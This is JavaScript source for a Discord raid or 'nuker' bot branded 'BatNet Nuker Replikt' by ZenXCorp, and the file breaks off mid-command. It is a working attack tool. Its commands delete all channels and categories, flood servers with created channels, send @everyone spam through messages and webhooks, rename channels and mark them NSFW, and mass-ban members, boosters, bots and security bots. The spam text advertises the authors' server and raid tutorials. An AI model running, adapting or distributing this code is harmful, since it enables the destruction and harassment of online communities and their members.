const { Client, Events, ComponentType, ReactionEmoji, GuildEmoji, WebhookClient, PermissionsBitField, GatewayIntentBits, EmbedBuilder, ChannelType, ActionRowBuilder, StringSelectMenuBuilder, StringSelectMenuOptionBuilder, ActivityType, PermissionOverwrites, PermissionFlagsBits, Embed, IntentsBitField, GuildVerificationLevel} = require('discord.js');
const client = new Client({intents: [103423]});
const chalk = require('chalk');
const fetch = require('node-fetch');
const whoiser = require('whoiser');
const system = require("systeminformation");
const fs = require('node:fs');
async function wait_ms(ms) {return new Promise(resolve => setTimeout(resolve, ms));};
const bot_token = ""; //Token del bot
const security_bots_ids = [""]; //IDs de los bots que consideres de seguridad.
const prefix = "."; //Prefijo del bot
client.on(`ready`,()=>{
    console.clear();
    console.log(chalk.red(`\n
     ___  ___  ____ __   ____ ____   __   _    __ _ ____ ____ 
     | .\\ |  \\ |_ _\\| \\|\\| __\\|_ _\\  | \\|\\|| \\ | V \\| __\\| . \\
     | .<_| . \\  || |  \\||  ]_  ||   |  \\|||_|\\|  <_|  ]_|  <_
     |___/|/\\_/  |/ |/\\_/|___/  |/   |/\\_/|___/|/\\_/|___/|/\\_/

     ~ Replikt by ${chalk.white(`$ ZenXCorp`)} || ${chalk.white(`.gg/zCQ8jQ2GBf`)}

     [i] Logged with: ${chalk.white(client.user.username+`#`+client.user.discriminator)}
     [i] Bot ID: ${chalk.white(client.user.id)}
     [i] Invite link: ${chalk.white(`https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`)}
    `));
});
client.on(`messageCreate`,async(msg)=>{
    const args = msg.content.slice(prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();
    //Raiding Commands
    //Channels
    if(msg.content === prefix+"clear_channels"){
        const chs = await msg.guild.channels.fetch();
        let i=0;
        const msgxd = await msg.author.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Channels`)
            .setDescription(`> **Eliminating channels...**\n> **0/${chs.size}**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
        for (let ch of chs.values()) {
            i++;
            try {
                if(i>=chs.size){
                    msgxd.edit({embeds:[
                        new EmbedBuilder()
                        .setTitle(`$ Channels`)
                        .setDescription(`> **Completed!**\`✅\`\n> **${i}/${chs.size}**`)
                        .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                        .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                    ]});
                    return;
                };
                await ch.delete("https://discord.gg/zCQ8jQ2GBf");
                msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Channels`)
                    .setDescription(`> **Eliminating channels...**\n> **\`${ch.name}\` \`✅\`**\n> **${i}/${chs.size}**`)
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
            } catch (e) {
                msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Channels`)
                    .setDescription(`> **Eliminating channels...**\n> **\`${ch.name}\` \`❌\`\n> **${i}/${chs.size}**`)
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
                console.log(e);
            };
        };
    };
    if(msg.content === prefix+"nuke"){
        const chs = await msg.guild.channels.fetch();
        let i=0;
        const msgxd = await msg.author.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Channels`)
            .setDescription(`> **Eliminating channels...**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
        for (let ch of chs.values()) {
            i++;
            try {
                if(i>=chs.size){
                    msgxd.edit({embeds:[
                        new EmbedBuilder()
                        .setTitle(`$ Channels`)
                        .setDescription(`> **Completed! \`✅\`**`)
                        .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                        .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                    ]});
                };
                ch.delete("https://discord.gg/zCQ8jQ2GBf");
            } catch (e) {
                console.log(e);
            };
        };
        await msg.guild.channels.create({name:`nuked-by-zenxcorp`,type:ChannelType.GuildText}).then(async(ch)=>{
            await ch.send({content:`> - [ ||@everyone|| ]\n> ** https://discord.gg/zCQ8jQ2GBf **\n> ** https://dsc.gg/zenxcorpp **`,embeds:[
                new EmbedBuilder()
                .setTitle(`⸸                Servidor nukeado por Zen𝐗                ⸸\n                                #Zen𝐗𝐎n𝐓op                             `)
                .setDescription(`󠀠‎\n ‎ **› ‎ ‎ ‎ ‎ Si quieres recuperar tu servidor entra a ZenX ! ‎ ‎ ‎ ‎ ‹**\n\n\`\`\`yaml\nbot r͢a͢id  ×   discord̲ too̲l̲s̲   ×  s̲hop\`\`\`\n‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ------------------  Ж  ------------------\n\n**。Servidor de ZenX: [Invitación](https://discord.gg/zCQ8jQ2GBf)**\n\n**。Youtube: [Cómo raidear un servidor de Discord?](https://www.youtube.com/watch?v=umo4zcoOrdI)**\n**。Youtube: [Raid Tool Gratis (SRT)](https://www.youtube.com/watch?v=YUIKf2bxvE8)**\n\n-------------------------  Ж  -------------------------`)
            ]});
        });
    };
    if(msg.content === prefix+"raid"){
        async function spam_ch(chid) {
            const ch = msg.guild.channels.cache.get(chid);
            for (let index = 0; index < 20; index++) {
                try {
                    await ch.send({content:`> - [ ||@everyone|| ]\n> ** https://discord.gg/zCQ8jQ2GBf **\n> ** https://dsc.gg/zenxcorpp **`, embeds:[
                        new EmbedBuilder()
                        .setImage(`https://cdn.discordapp.com/attachments/1161131445268525116/1167800602567397426/picasion.com_c642a65df1484b8d69da558099082bb9.gif?ex=654f7210&is=653cfd10&hm=53ed05fda49076f74d6a4be979cb4a89f4928a09193f1d19d53f2d2918c5f2fe&`)
                        .setTitle(`⸸                Servidor destruido por Zen𝐗                ⸸\n                                #Zen𝐗𝐎n𝐓op                             `)
                        .setDescription(`󠀠‎\n ‎ **› ‎ ‎ ‎ ‎ Si quieres recuperar tu servidor entra a ZenX ! ‎ ‎ ‎ ‎ ‹**\n\n\`\`\`yaml\nbot r͢a͢id  ×   discord̲ too̲l̲s̲   ×  s̲hop\`\`\`\n‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ------------------  Ж  ------------------\n\n**。Servidor de ZenX: [Invitación](https://discord.gg/zCQ8jQ2GBf)**\n\n**。Youtube: [Cómo raidear un servidor de Discord?](https://www.youtube.com/watch?v=umo4zcoOrdI)**\n**。Youtube: [Raid Tool Gratis (SRT)](https://www.youtube.com/watch?v=YUIKf2bxvE8)**\n\n-------------------------  Ж  -------------------------`)
                    ]});
                } catch (e) {
                    console.log(e);
                };
            };
        };
        let canales_xdxd = [];
        async function create_txt_channel() {
            const res = await fetch(`https://discord.com/api/v9/guilds/${msg.guild.id}/channels`,{
                method:'POST',
                headers: {
                    "Authorization":`Bot ${bot_token}`,
                    "content-type":"application/json"
                },
                body: JSON.stringify({
                    "name":"zenxcorp-on-top",
                    "type":"0"
                })
            });
            const jsonxdxd = await res.json();
            canales_xdxd.push(jsonxdxd['id']);
            if(canales_xdxd.length >= 100){
                let channelss = await msg.guild.channels.fetch();
                for (const ch of channelss.values()) {
                    try {
                        spam_ch(ch.id);
                    } catch (e) {
                        console.log(e);
                    };  
                };
            };
        };
        await msg.author.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Channels`)
            .setDescription(`> **Sending messages...**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
        for (let index = 0; index < 100; index++) {
            await wait_ms(25);
            create_txt_channel();
        };
    };
    if(msg.content === prefix+"spam"){
        async function spam_ch(chid) {
            const ch = msg.guild.channels.cache.get(chid);
            for (let index = 0; index < 20; index++) {
                try {
                    await ch.send({content:`> - [ ||@everyone|| ]\n> ** https://discord.gg/zCQ8jQ2GBf **\n> ** https://dsc.gg/zenxcorpp **`, embeds:[
                        new EmbedBuilder()
                        .setImage(`https://cdn.discordapp.com/attachments/1161131445268525116/1167800602567397426/picasion.com_c642a65df1484b8d69da558099082bb9.gif?ex=654f7210&is=653cfd10&hm=53ed05fda49076f74d6a4be979cb4a89f4928a09193f1d19d53f2d2918c5f2fe&`)
                        .setTitle(`⸸                Servidor destruido por Zen𝐗                ⸸\n                                #Zen𝐗𝐎n𝐓op                             `)
                        .setDescription(`󠀠‎\n ‎ **› ‎ ‎ ‎ ‎ Si quieres recuperar tu servidor entra a ZenX ! ‎ ‎ ‎ ‎ ‹**\n\n\`\`\`yaml\nbot r͢a͢id  ×   discord̲ too̲l̲s̲   ×  s̲hop\`\`\`\n‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ------------------  Ж  ------------------\n\n**。Servidor de ZenX: [Invitación](https://discord.gg/zCQ8jQ2GBf)**\n\n**。Youtube: [Cómo raidear un servidor de Discord?](https://www.youtube.com/watch?v=umo4zcoOrdI)**\n**。Youtube: [Raid Tool Gratis (SRT)](https://www.youtube.com/watch?v=YUIKf2bxvE8)**\n\n-------------------------  Ж  -------------------------`)
                    ]});
                } catch (e) {
                    console.log(e);
                };
            };
        };
        const chs = await msg.guild.channels.fetch();
        await msg.author.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Channels`)
            .setDescription(`> **Sending messages...**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
        for (const ch of chs.values()) {
            spam_ch(ch.id);
        };
    };
    if(msg.content === prefix+"spam2"){
        async function wh_spam(whtoken,whid) {
            const wh = new WebhookClient({id:whid, token:whtoken});
            for (let index = 0; index < 30; index++) {
                await wh.send({content:`> - [ ||@everyone|| ]\n> ** https://discord.gg/zCQ8jQ2GBf **\n> ** https://dsc.gg/zenxcorpp **`, embeds:[
                    new EmbedBuilder()
                    .setImage(`https://cdn.discordapp.com/attachments/1161131445268525116/1167800602567397426/picasion.com_c642a65df1484b8d69da558099082bb9.gif?ex=654f7210&is=653cfd10&hm=53ed05fda49076f74d6a4be979cb4a89f4928a09193f1d19d53f2d2918c5f2fe&`)
                    .setTitle(`⸸                Servidor destruido por Zen𝐗                ⸸\n                                #Zen𝐗𝐎n𝐓op                             `)
                    .setDescription(`󠀠‎\n ‎ **› ‎ ‎ ‎ ‎ Si quieres recuperar tu servidor entra a ZenX ! ‎ ‎ ‎ ‎ ‹**\n\n\`\`\`yaml\nbot r͢a͢id  ×   discord̲ too̲l̲s̲   ×  s̲hop\`\`\`\n‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ------------------  Ж  ------------------\n\n**。Servidor de ZenX: [Invitación](https://discord.gg/zCQ8jQ2GBf)**\n\n**。Youtube: [Cómo raidear un servidor de Discord?](https://www.youtube.com/watch?v=umo4zcoOrdI)**\n**。Youtube: [Raid Tool Gratis (SRT)](https://www.youtube.com/watch?v=YUIKf2bxvE8)**\n\n-------------------------  Ж  -------------------------`)
                ]});
            };
        };
        async function wh_create(ch) {
            ch.createWebhook({name:`$ ZenX Corp`,avatar:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`}).then((wh)=>{wh_spam(wh.token,wh.id)});
        };
        const chs = (await msg.guild.channels.fetch()).filter(ch=>ch.type===ChannelType.GuildText);
        let i=0;
        if(chs.size===0){
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setTitle(`$ Webhooks`)
                .setDescription(`> **No text channels**`)
                .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
            ]});
            return;
        };
        await msg.author.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Webhooks`)
            .setDescription(`> **Creation and sending of webhooks...**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
        for (let ch of chs.values()) {
            i++;
            try {
                wh_create(ch);
            } catch (e) {
                console.log(e);
            };
        };
    };
    if(msg.content === prefix+"edit_channels"){
        const chs = await msg.guild.channels.fetch();
        if(chs.size===0){return;}
        let i=0;
        const msgxd = await msg.author.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Channels`)
            .setDescription(`> **Updating channels...**\n> **0/${chs.size}**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
        for (let ch of chs.values()) {
            i++;
            try {
                if(i>=chs.size){
                    msgxd.edit({embeds:[
                        new EmbedBuilder()
                        .setTitle(`$ Channels`)
                        .setDescription(`> **Completed!**\`✅\`\n> **${i}/${chs.size}**`)
                        .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                        .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                    ]});
                    return;
                };
                await ch.setName("zenx-on-top");
                if(ch.type===ChannelType.GuildText){await ch.setNSFW(true, "$ ZenX Corp On Top");};
                msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Channels`)
                    .setDescription(`> **Updating channels...**\n> **\`${ch.name}\` \`✅\`**\n> **${i}/${chs.size}**`)
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
            } catch (e) {
                msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Channels`)
                    .setDescription(`> **Updating channels...**\n> **\`${ch.name}\` \`❌\`\n> **${i}/${chs.size}**`)
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
                console.log(e);
            };
        };
    };
    if(msg.content === prefix+"clear_categories"){
        const chs = (await msg.guild.channels.fetch()).filter(ch=>ch.type===ChannelType.GuildCategory);
        if(chs.size===0){
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setTitle(`$ Channels`)
                .setDescription(`> **No category channels**`)
                .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
            ]});
            return;
        };
        let i=0;
        const msgxd = await msg.author.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Channels`)
            .setDescription(`> **Eliminating channels...**\n> **0/${chs.size}**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
        for (let ch of chs.values()) {
            i++;
            try {
                if(i>=chs.size){
                    msgxd.edit({embeds:[
                        new EmbedBuilder()
                        .setTitle(`$ Channels`)
                        .setDescription(`> **Completed!**\`✅\`\n> **${i}/${chs.size}**`)
                        .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                        .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                    ]});
                    return;
                };
                await ch.delete("https://discord.gg/zCQ8jQ2GBf");
                msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Channels`)
                    .setDescription(`> **Eliminating channels...**\n> **\`${ch.name}\` \`✅\`**\n> **${i}/${chs.size}**`)
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
            } catch (e) {
                msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Channels`)
                    .setDescription(`> **Eliminating channels...**\n> **\`${ch.name}\` \`❌\`\n> **${i}/${chs.size}**`)
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
                console.log(e);
            };
        };
    };
    //Members
    if(msg.content === prefix+"massban"){
        const members_ = await msg.guild.members.fetch();
        let i=0;
        const msgxd = await msg.author.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Members`)
            .setDescription(`> **Banning members...**\n> **0/${members_.size}**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
        for (let member of members_.values()) {
            i++;
            try {
                if(i>=members_.size){
                    msgxd.edit({embeds:[
                        new EmbedBuilder()
                        .setTitle(`$ Members`)
                        .setDescription(`> **Completed!**\`✅\`\n> **${i}/${members_.size}**`)
                        .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                        .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                    ]});
                    return;
                };
                await member.ban("https://discord.gg/zCQ8jQ2GBf");
                msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Members`)
                    .setDescription(`> **Banning members...**\n> **\`${member.name}\` \`✅\`**\n> **${i}/${members_.size}**`)
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
            } catch (e) {
                msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Members`)
                    .setDescription(`> **Banning members...**\n> **\`${member.name}\` \`❌\`**\n> **${i}/${members_.size}**`)
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
                console.log(e);
            };
        };
    };
    if(msg.content === prefix+"ban_boosters"){
        const members_ = (await msg.guild.members.fetch()).filter(member=>member.premiumSinceTimestamp);
        let i=0;
        if(members_.size===0){
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setTitle(`$ Members`)
                .setDescription(`> **No premium members found**`)
                .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
            ]});
            return;
        };
        const msgxd = await msg.author.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Members`)
            .setDescription(`> **Banning premium members...**\n> **0/${members_.size}**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
        for (let member of members_.values()) {
            i++;
            try {
                if(i>=members_.size){
                    msgxd.edit({embeds:[
                        new EmbedBuilder()
                        .setTitle(`$ Members`)
                        .setDescription(`> **Completed!**\`✅\`\n> **${i}/${members_.size}**`)
                        .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                        .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                    ]});
                    return;
                };
                await member.ban("https://discord.gg/zCQ8jQ2GBf");
                msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Members`)
                    .setDescription(`> **Banning premium members...**\n> **\`${member.name}\` \`✅\`**\n> **${i}/${members_.size}**`)
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
            } catch (e) {
                msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Members`)
                    .setDescription(`> **Banning premium members...**\n> **\`${member.name}\` \`❌\`**\n> **${i}/${members_.size}**`)
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
                console.log(e);
            };
        };
    };
    if(msg.content === prefix+"ban_security"){
        const members_ = await msg.guild.members.fetch();
        let i=0;
        if(members_.size===0){
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setTitle(`$ Members`)
                .setDescription(`> **No security bots found**`)
                .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
            ]});
            return;
        }
        const msgxd = await msg.author.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Members`)
            .setDescription(`> **Banning members...**\n> **0/${members_.size}**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
        for (let member of members_.values()) {
            i++;
            try {
                if(i>=members_.size){
                    msgxd.edit({embeds:[
                        new EmbedBuilder()
                        .setTitle(`$ Members`)
                        .setDescription(`> **Completed!**\`✅\`\n> **${i}/${members_.size}**`)
                        .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                        .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                    ]});
                    return;
                };
                if(!security_bots_ids.includes(member.user.id)){return;};
                await member.ban("https://discord.gg/zCQ8jQ2GBf");
                msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Members`)
                    .setDescription(`> **Banning members...**\n> **\`${member.name}\` \`✅\`**\n> **${i}/${members_.size}**`)
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
            } catch (e) {
                msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Members`)
                    .setDescription(`> **Banning members...**\n> **\`${member.name}\` \`❌\`**\n> **${i}/${members_.size}**`)
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
                console.log(e);
            };
        };
    };
    if(msg.content === prefix+"ban_bots"){
        const members_ = (await msg.guild.members.fetch()).filter(member=>member.user.bot);
        if(members_.size===0){
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setTitle(`$ Members`)
                .setDescription(`> **No bots found**`)
                .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
            ]});
            return;
        }
        let i=0;
        const msgxd = await msg.author.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Members`)
            .setDescription(`> **Banning bots...**\n> **0/${members_.size}**`)
